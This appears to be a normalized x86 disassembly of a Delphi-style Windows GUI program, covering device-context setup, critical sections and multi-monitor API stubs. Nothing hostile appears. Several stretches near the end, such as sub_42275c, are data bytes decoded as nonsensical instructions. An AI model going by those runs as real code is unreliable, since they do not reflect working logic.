call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4214a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4214e0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ee0c
mov eax [ ebx + 0x28 ]
call sub_41ee10
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x28 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_421560
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_421334
mov eax [ ebx + 0x28 ]
mov ebx [ eax + 0xc ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax esi
call sub_4156e4
pop esi
pop ebx
retn
sub_4215b0
push ebx
push 0x0
call GetDC
mov ebx eax
push 0x5a
push ebx
call GetDeviceCaps
mov [ rw-data ] eax
push ebx
push 0x0
call ReleaseDC
mov eax rw-data
mov edx 0xf
call sub_41dae8
mov [ rw-data ] eax
pop ebx
retn
sub_4215e8
push ebx
push esi
add esp 0xffffffc8
mov bl 0x1
push 0x0
call GetDC
mov esi eax
test esi esi
je r-xdata
mov eax ebx
add esp 0x38
pop esi
pop ebx
retn
mov eax [ rw-data ]
push eax
push esi
call SelectObject
test eax eax
je r-xdata
push esi
push 0x0
call ReleaseDC
push esp
push esi
call GetTextMetricsA
test eax eax
je r-xdata
mov bl [ esp + 0x34 ]
sub_42162c
push ebx
push esi
push edi
push 0x48
mov eax [ rw-data ]
push eax
push 0x8
call MulDiv
neg eax
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_4215e8
mov ebx eax
mov eax ebx
sub al 0x80
jne r-xdata
mov esi r-xdata
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x48
mov eax [ rw-data ]
push eax
push 0x9
call MulDiv
neg eax
mov [ rw-data ] eax
mov [ rw-data ] bl
sub_4216f8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_421730
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax esi
call sub_421928
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_421774
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_42175c
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42181c
mov eax [ ebp - 0x4 ]
call sub_421768
retn
mov eax 0x10
call sub_4026bc
mov [ ebp - 0x8 ] eax
mov edi [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ edi ] eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_421828
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] esi
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp esi [ eax + 0xc ]
jne r-xdata
sub_421828
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41f8b4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_421907
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x8 ]
call sub_41fe7c
mov edi eax
mov eax [ edi + 0x14 ]
xor edx edx
call sub_41cb20
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_41ca04
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_41240c
lea edx [ ebp - 0x18 ]
mov eax edi
call sub_41cda8
xor esi esi
mov edx ebx
and edx 0x80000001
jns r-xdata
dec eax
or eax 0xfffffffe
inc eax
cmp eax edx
jne r-xdata
dec edx
or edx 0xfffffffe
inc edx
inc ebx
cmp ebx 0x9
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_41d174
mov eax esi
and eax 0x80000001
jns r-xdata
inc esi
cmp esi 0x9
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x8 ]
call sub_41fb38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_421928
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_42175c
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42197a
mov eax [ ebp - 0x4 ]
call sub_421768
retn
mov esp ebp
pop ebp
retn
sub_42197a
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026dc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
call sub_403234
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_42175c
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42197a
mov eax [ ebp - 0x4 ]
call sub_421768
retn
mov esp ebp
pop ebp
retn
sub_4219a0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_41bd78
push eax
mov eax ebx
call sub_41bd78
mov edx eax
mov eax [ rw-data ]
pop ecx
call sub_421774
mov eax [ eax + 0x4 ]
pop esi
pop ebx
retn
sub_4219d8
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421aa8
retn
mov eax [ rw-data ]
call sub_403234
mov eax [ rw-data ]
call sub_403234
mov eax [ rw-data ]
call sub_403234
call sub_41eaf0
mov eax [ rw-data ]
call sub_403234
mov eax [ rw-data ]
call sub_403234
mov eax [ rw-data ]
call sub_403234
mov eax [ rw-data ]
call sub_403234
mov eax [ rw-data ]
call sub_403234
mov eax [ rw-data ]
push eax
call DeleteObject
push rw-data
call DeleteCriticalSection
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_4049e8
mov eax rw-data
mov ecx 0x34
mov edx [ r-xdata ]
call sub_4049e8
sub_421aac
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_4215b0
push rw-data
call InitializeCriticalSection
push rw-data
call InitializeCriticalSection
push 0x7
call GetStockObject
mov [ rw-data ] eax
push 0x5
call GetStockObject
mov [ rw-data ] eax
push 0xd
call GetStockObject
mov [ rw-data ] eax
push 0x7f00
push 0x0
call LoadIconA
mov [ rw-data ] eax
call sub_42162c
mov cx 0x2c
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b530
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b530
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b530
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4216f8
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_413a54
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_413a54
mov [ rw-data ] eax
mov ecx sub_41bd88
mov edx sub_41bd98
mov eax [ sub_41a7f8 ]
call sub_413208
mov ecx r-xdata
mov edx sub_41bfa0
mov eax [ r-xdata ]
call sub_413208
sub_421bb8
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421be4
retn
sub_421d20
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403204
mov [ esi + 0x10 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_421d78
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_413a50
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
mov eax edi
call sub_403234
sub_421dbc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403204
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_421e00
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403234
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_421e44
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_413730
mov eax esi
pop esi
pop ebx
retn
sub_421e70
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421e9c
retn
sub_421f64
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421f90
retn
sub_421f9c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_40441c
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
xor eax eax
mov al bl
cmp [ eax + rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422062
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
cmp [ rw-data ] 0x0
je r-xdata
xor esi esi
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov esi edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40442c
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov al bl
mov [ eax + rw-data ] 0x1
mov [ rw-data ] 0x1
test esi esi
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_421f9c
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_403f6c
sub_422084
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
mov edx ebx
add edx 0xffffffb4
sub edx 0x2
jb r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
xor eax eax
call sub_421f9c
mov [ rw-data ] eax
push ebx
call [ rw-data ]
jmp r-xdata
xor eax eax
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
cmp eax 0xffffffff
jne r-xdata
xor ebx ebx
jmp r-xdata
dec edx
je r-xdata
push ebx
call GetSystemMetrics
mov ebx 0x1
dec edx
sub edx 0x2
jae r-xdata
mov eax 0x1
jmp r-xdata
sub_42210c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor esi esi
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x2
call sub_421f9c
mov [ rw-data ] eax
push edi
push ebx
call [ rw-data ]
mov esi eax
jmp r-xdata
mov esi 0x12340042
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebx + 0xc ] 0x0
jle r-xdata
push 0x0
call [ rw-data ]
cmp eax [ ebx ]
jle r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebx + 0x4 ]
jle r-xdata
sub_42219c
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
and eax 0x3
test al al
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x1
call sub_421f9c
mov [ rw-data ] eax
push ebx
push esi
call [ rw-data ]
jmp r-xdata
push esi
call IsIconic
test eax eax
je r-xdata
mov eax 0x12340042
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetWindowPlacement
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
push eax
call sub_42210c
sub_422232
add [ eax ] al
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x3
call sub_421f9c
mov [ rw-data ] eax
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov ebx 0x12340042
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push 0x0
call [ rw-data ]
cmp esi eax
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_4222b3
call [ eax ]
add [ eax ] al
add [ ebp + 0x6f ] cl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x6d6f7246
push eax
outsd
imul ebp [ esi + 0x74 ] 0x0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_421f9c
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_4223a0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x5
call sub_421f9c
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_422474
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x6
call sub_421f9c
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_422548
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x7
call sub_421f9c
mov [ rw-data ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
push 0x0
call [ rw-data ]
mov [ ebp - 0x14 ] eax
push 0x1
call [ rw-data ]
mov [ ebp - 0x10 ] eax
test esi esi
je r-xdata
test edi edi
je r-xdata
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetClipBox
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push esi
call GetDCOrgEx
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push 0x12340042
call [ ebp + 0x10 ]
mov ebx eax
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
neg eax
push eax
mov eax [ ebp - 0x8 ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x1
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_4226e3
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422710
retn
sub_422724
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422750
retn
sub_42275c
pushad
daa
inc edx
add [ edi ] cl
or eax 0x6c654849
dec eax
insb
jo r-xdata
insb
arpl [ gs : edi + ebp * 2 + 0x72 ] si
adc al 0x11
inc eax
add [ ecx ] al
pop eax
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc ecx [ ecx + 0x45 ]
outsb
je r-xdata
push [ eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422750
retn
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
inc edx
outsb
dec eax
insb
adc [ ebx + 0x4fc000b9 ] esp
jae r-xdata
outsd
outsb
je r-xdata
sub [ edx ] eax
or al 0x0
popad
outsb
popad
jb r-xdata
lodsd [ esi ]
jns r-xdata
imul esp [ ebp + 0x77 ] 0x27c87265
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add [ edi ] cl
adc [ ecx + 0x43 ] ecx
jne r-xdata
add bh bh
dec esp
daa
inc edx
lodsd [ esi ]
imul esp [ ebp + 0x77 ] 0x11147265
inc eax
add [ ecx ] al
xchg ebx eax
cmp cl [ ecx ]
dec eax
insb
jae r-xdata
or [ eax + 0x65 ] ecx
insb
adc [ eax ] eax
add [ esi - 0x6d ] esp
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
add [ eax ] al
int3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp ] al
inc edx
add [ eax + eax ] cl
outsb
je r-xdata
jo r-xdata
or [ eax + 0x65 ] ecx
insb
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc [ eax ] eax
add [ ebx + edx * 4 - 0x4 ] esp
sub [ edx ] al
outsb
je r-xdata
adc eax 0x65705349
je r-xdata
jns r-xdata
add [ edi ] cl
outsb
je r-xdata
dec [ ebx + 0x422798c0 ]
add [ edi ] cl
or ecx [ ecx + 0x48 ]
insb
jo r-xdata
add bh bh
inc eax
outsb
je r-xdata
insb
jo r-xdata
jo r-xdata
cmp cl [ ecx ]
dec eax
insb
add ah cl
xor [ eax ] eax
call 0x24426932
xor al [ eax ]
adc al 0x45
dec eax
insb
jo r-xdata
add ah cl
insd
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
jae r-xdata
jns r-xdata
add al al
dec edi
jae r-xdata
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
insd
dec eax
insb
jo r-xdata
jo r-xdata
insb
je r-xdata
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
jae r-xdata
inc eax
add al ch
xor [ eax ] eax
and al 0x32
inc eax
add [ esi ] cl
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al cl
daa
imul ebp [ edi + 0x6e ] 0x6800408d
sub [ edx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x4229
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x29 ] bh
inc edx
add [ eax + eax ] cl
add [ eax ] al
mov al [ 0x64004010 ]
xor al 0x40
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0x24426996
xor al [ eax ]
push cs
jae r-xdata
dec ecx
imul esp [ ebp + 0x77 ] 0x28047265
inc edx
add [ ecx ] al
xchg bx ax
cld
add [ edi ] cl
or al 0x49
dec eax
insb
jo r-xdata
add bh bh
dec [ ebx + 0x422884c0 ]
sub [ edx ] al
unpckhps xmm1 [ ecx + 0x53 ]
jo r-xdata
add bh bh
inc [ eax + ebp + 0x42 ]
cld
inc edx
add [ ecx ] al
xchg bx ax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
daa
insd
adc al 0x11
inc eax
add [ ecx ] al
push ebx
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
js r-xdata
movlps [ ecx + 0x45 ] xmm1
add bh bh
dec [ ebx + 0x422808c0 ]
add [ edi ] cl
xor [ edx ] ecx
add [ eax ] al
add eax 0xffffffd4
jmp r-xdata
imul esp [ ebp + 0x77 ] 0x6f4e7265
mov eax eax
push esi
je r-xdata
lea eax [ eax ]
add al 0x29
inc edx
add [ eax ] al
add [ eax ] al
add bh bh
dec [ ebp + 0x29040040 ]
jae r-xdata
arpl [ ecx + 0x61 ] bp
insb
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
jo r-xdata
cmp cl [ ecx ]
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
inc edx
add [ eax + eax ] al
insd
inc ebp
js r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_403fc0
add [ eax ] al
andps xmm1 [ eax + 0x65 ]
insb
jo r-xdata
add al 0x0
jo r-xdata
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b35c
call sub_4039a8
jmp r-xdata
int3
